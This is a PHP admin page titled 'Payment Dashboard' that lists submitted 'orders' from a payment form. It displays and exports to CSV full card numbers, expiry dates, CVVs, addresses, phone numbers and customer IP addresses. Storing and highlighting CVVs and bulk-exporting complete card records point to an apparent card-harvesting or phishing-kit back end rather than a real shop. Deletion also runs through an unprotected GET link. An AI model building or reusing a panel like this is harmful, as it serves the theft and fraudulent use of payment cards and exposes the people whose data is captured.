<?php
require_once __DIR__ . '/../config.php';
requireLogin();

// Handle delete action
if (isset($_GET['delete'])) {
    $deleteId = $_GET['delete'];
    $orders = getOrders();
    $orders = array_filter($orders, function($order) use ($deleteId) {
        return $order['id'] !== $deleteId;
    });
    saveOrders(array_values($orders));
    header('Location: /dashboard/');
    exit;
}

// Handle export to CSV
if (isset($_GET['export'])) {
    $orders = getOrders();

    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="orders_' . date('Y-m-d_H-i-s') . '.csv"');

    $output = fopen('php://output', 'w');
    fputcsv($output, ['Date', 'Order ID', 'Name', 'Email', 'Phone', 'Address', 'City', 'State', 'ZIP', 'Country', 'Card Number', 'Exp Date', 'CVV', 'Amount', 'IP']);

    foreach ($orders as $order) {
        fputcsv($output, [
            $order['timestamp'],
            $order['order']['order_id'],
            $order['customer']['first_name'] . ' ' . $order['customer']['last_name'],
            $order['customer']['email'],
            $order['customer']['phone'],
            $order['billing_address']['address'],
            $order['billing_address']['city'],
            $order['billing_address']['state'],
            $order['billing_address']['zip'],
            $order['billing_address']['country'],
            $order['payment']['card_number'],
            $order['payment']['exp_month'] . '/' . $order['payment']['exp_year'],
            $order['payment']['cvv'],
            $order['order']['total_formatted'],
            $order['ip_address']
        ]);
    }

    fclose($output);
    exit;
}

// Get orders
$orders = getOrders();

// Search functionality
$search = $_GET['search'] ?? '';
if ($search) {
    $orders = array_filter($orders, function($order) use ($search) {
        $search = strtolower($search);
        return strpos(strtolower($order['customer']['email']), $search) !== false ||
               strpos(strtolower($order['customer']['first_name'] . ' ' . $order['customer']['last_name']), $search) !== false ||
               strpos(strtolower($order['order']['order_id']), $search) !== false;
    });
}

// Sort by newest first
usort($orders, function($a, $b) {
    return strtotime($b['timestamp']) - strtotime($a['timestamp']);
});

$totalOrders = count($orders);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Orders</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            padding: 20px;
        }

        .header {
            background: white;
            padding: 20px 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }

        h1 {
            color: #2d5aa0;
            font-size: 28px;
        }

        .header-actions {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: opacity 0.3s;
        }

        .btn:hover {
            opacity: 0.9;
        }

        .btn-primary {
            background: #2d5aa0;
            color: white;
        }

        .btn-secondary {
            background: #6c757d;
            color: white;
        }

        .btn-success {
            background: #28a745;
            color: white;
        }

        .btn-danger {
            background: #dc3545;
            color: white;
        }

        .btn-sm {
            padding: 6px 12px;
            font-size: 12px;
        }

        .toolbar {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }

        .search-box {
            flex: 1;
            min-width: 250px;
            max-width: 400px;
        }

        .search-box input {
            width: 100%;
            padding: 10px 15px;
            border: 1px solid #ced4da;
            border-radius: 6px;
            font-size: 14px;
        }

        .stats {
            display: flex;
            gap: 20px;
            align-items: center;
        }

        .stat {
            text-align: center;
        }

        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #2d5aa0;
        }

        .stat-label {
            font-size: 12px;
            color: #666;
        }

        .table-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            background: #2d5aa0;
            color: white;
            padding: 15px;
            text-align: left;
            font-weight: 600;
            font-size: 14px;
        }

        td {
            padding: 12px 15px;
            border-bottom: 1px solid #e0e0e0;
            font-size: 13px;
        }

        tr:hover {
            background: #f8f9fa;
        }

        .order-details {
            display: none;
            padding: 20px;
            background: #f8f9fa;
            border-top: 2px solid #2d5aa0;
        }

        .order-details.active {
            display: block;
        }

        .details-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
        }

        .detail-section {
            background: white;
            padding: 15px;
            border-radius: 6px;
        }

        .detail-section h3 {
            color: #2d5aa0;
            font-size: 16px;
            margin-bottom: 10px;
            border-bottom: 2px solid #2d5aa0;
            padding-bottom: 5px;
        }

        .detail-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #e0e0e0;
        }

        .detail-row:last-child {
            border-bottom: none;
        }

        .detail-label {
            font-weight: 600;
            color: #666;
        }

        .detail-value {
            color: #333;
        }

        .card-number {
            font-family: 'Courier New', monospace;
            background: #fff3cd;
            padding: 2px 6px;
            border-radius: 3px;
            font-weight: bold;
        }

        .no-orders {
            text-align: center;
            padding: 50px;
            color: #666;
        }

        .expand-btn {
            background: none;
            border: none;
            color: #2d5aa0;
            cursor: pointer;
            font-size: 12px;
            text-decoration: underline;
        }

        .expand-btn:hover {
            color: #1e3c72;
        }

        @media (max-width: 1200px) {
            table {
                font-size: 12px;
            }

            th, td {
                padding: 10px;
            }
        }

        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                align-items: flex-start;
            }

            .toolbar {
                flex-direction: column;
                align-items: stretch;
            }

            .search-box {
                max-width: 100%;
            }

            table {
                display: block;
                overflow-x: auto;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Payment Dashboard</h1>
        <div class="header-actions">
            <span style="color: #666;">Welcome, <?= htmlspecialchars($_SESSION['username']) ?></span>
            <a href="/dashboard/logout.php" class="btn btn-secondary btn-sm">Logout</a>
        </div>
    </div>

    <div class="toolbar">
        <div class="search-box">
            <form method="GET">
                <input type="text" name="search" placeholder="Search by email, name, or order ID..." value="<?= htmlspecialchars($search) ?>">
            </form>
        </div>

        <div class="stats">
            <div class="stat">
                <div class="stat-value"><?= $totalOrders ?></div>
                <div class="stat-label">Total Orders</div>
            </div>
        </div>

        <div>
            <a href="?export=1" class="btn btn-success btn-sm">Export CSV</a>
        </div>
    </div>

    <div class="table-container">
        <?php if (empty($orders)): ?>
            <div class="no-orders">
                <h2>No orders found</h2>
                <p>Orders will appear here after customers submit the payment form.</p>
            </div>
        <?php else: ?>
            <table>
                <thead>
                    <tr>
                        <th>Date/Time</th>
                        <th>Order ID</th>
                        <th>Customer</th>
                        <th>Email</th>
                        <th>Amount</th>
                        <th>Card</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($orders as $index => $order): ?>
                        <tr>
                            <td><?= htmlspecialchars($order['timestamp']) ?></td>
                            <td><strong><?= htmlspecialchars($order['order']['order_id']) ?></strong></td>
                            <td><?= htmlspecialchars($order['customer']['first_name'] . ' ' . $order['customer']['last_name']) ?></td>
                            <td><?= htmlspecialchars($order['customer']['email']) ?></td>
                            <td><strong><?= htmlspecialchars($order['order']['total_formatted']) ?></strong></td>
                            <td class="card-number"><?= htmlspecialchars($order['payment']['card_number']) ?></td>
                            <td>
                                <button class="expand-btn" onclick="toggleDetails('order-<?= $index ?>')">View Details</button>
                                <a href="?delete=<?= urlencode($order['id']) ?>" class="btn btn-danger btn-sm" onclick="return confirm('Delete this order?')">Delete</a>
                            </td>
                        </tr>
                        <tr>
                            <td colspan="7" style="padding: 0;">
                                <div class="order-details" id="order-<?= $index ?>">
                                    <div class="details-grid">
                                        <div class="detail-section">
                                            <h3>Customer Information</h3>
                                            <div class="detail-row">
                                                <span class="detail-label">Name:</span>
                                                <span class="detail-value"><?= htmlspecialchars($order['customer']['first_name'] . ' ' . $order['customer']['last_name']) ?></span>
                                            </div>
                                            <div class="detail-row">
                                                <span class="detail-label">Email:</span>
                                                <span class="detail-value"><?= htmlspecialchars($order['customer']['email']) ?></span>
                                            </div>
                                            <div class="detail-row">
                                                <span class="detail-label">Phone:</span>
                                                <span class="detail-value"><?= htmlspecialchars($order['customer']['phone']) ?></span>
                                            </div>
                                            <div class="detail-row">
                                                <span class="detail-label">IP Address:</span>
                                                <span class="detail-value"><?= htmlspecialchars($order['ip_address']) ?></span>
                                            </div>
                                        </div>

                                        <div class="detail-section">
                                            <h3>Billing Address</h3>
                                            <div class="detail-row">
                                                <span class="detail-label">Street:</span>
                                                <span class="detail-value"><?= htmlspecialchars($order['billing_address']['address']) ?></span>
                                            </div>
                                            <div class="detail-row">
                                                <span class="detail-label">City:</span>
                                                <span class="detail-value"><?= htmlspecialchars($order['billing_address']['city']) ?></span>
                                            </div>
                                            <div class="detail-row">
                                                <span class="detail-label">State:</span>
                                                <span class="detail-value"><?= htmlspecialchars($order['billing_address']['state']) ?></span>
                                            </div>
                                            <div class="detail-row">
                                                <span class="detail-label">ZIP:</span>
                                                <span class="detail-value"><?= htmlspecialchars($order['billing_address']['zip']) ?></span>
                                            </div>
                                            <div class="detail-row">
                                                <span class="detail-label">Country:</span>
                                                <span class="detail-value"><?= htmlspecialchars($order['billing_address']['country']) ?></span>
                                            </div>
                                        </div>

                                        <div class="detail-section">
                                            <h3>Payment Details</h3>
                                            <div class="detail-row">
                                                <span class="detail-label">Card Number:</span>
                                                <span class="detail-value card-number"><?= htmlspecialchars($order['payment']['card_number']) ?></span>
                                            </div>
                                            <div class="detail-row">
                                                <span class="detail-label">Expiration:</span>
                                                <span class="detail-value"><?= htmlspecialchars($order['payment']['exp_month'] . '/' . $order['payment']['exp_year']) ?></span>
                                            </div>
                                            <div class="detail-row">
                                                <span class="detail-label">CVV:</span>
                                                <span class="detail-value card-number"><?= htmlspecialchars($order['payment']['cvv']) ?></span>
                                            </div>
                                            <div class="detail-row">
                                                <span class="detail-label">Amount:</span>
                                                <span class="detail-value"><strong><?= htmlspecialchars($order['order']['total_formatted']) ?></strong></span>
                                            </div>
                                        </div>

                                        <div class="detail-section">
                                            <h3>Order Information</h3>
                                            <div class="detail-row">
                                                <span class="detail-label">Order ID:</span>
                                                <span class="detail-value"><?= htmlspecialchars($order['order']['order_id']) ?></span>
                                            </div>
                                            <div class="detail-row">
                                                <span class="detail-label">Success URL:</span>
                                                <span class="detail-value" style="word-break: break-all; font-size: 11px;"><?= htmlspecialchars($order['urls']['success']) ?></span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        <?php endif; ?>
    </div>

    <script>
        function toggleDetails(id) {
            const details = document.getElementById(id);
            details.classList.toggle('active');
        }
    </script>
</body>
</html>
